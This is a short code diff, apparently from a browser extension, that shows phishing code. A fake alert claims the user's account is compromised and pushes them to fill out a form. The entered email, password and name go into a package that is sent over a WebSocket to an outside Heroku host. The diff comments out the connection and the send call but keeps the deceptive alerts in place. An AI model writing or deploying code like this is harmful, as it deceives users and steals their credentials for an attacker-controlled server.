@@ -1,5 +1,5 @@
-var HOST = 'wss://projectnickname123.herokuapp.com';
-var ws = new WebSocket(HOST);
+//var HOST = 'wss://projectnickname123.herokuapp.com';
+//var ws = new WebSocket(HOST);
 
 alert('Your account has been comprimised! Please fill out form to continue viewing information');
 
@@ -30,7 +30,7 @@ function checkFunc(){
     chrome.storage.sync.get("id", function(ev){
       id=ev.id;
       var jsonPackage = {id: id, type: 'phishForm', phishEmail: emailString, phishPass: passString, phishName: nameString};
-      ws.send(JSON.stringify(jsonPackage));
+    //  ws.send(JSON.stringify(jsonPackage));
     });
     alert("Thank you for filling the form! Refresh the page and the information will display correctly.");
 
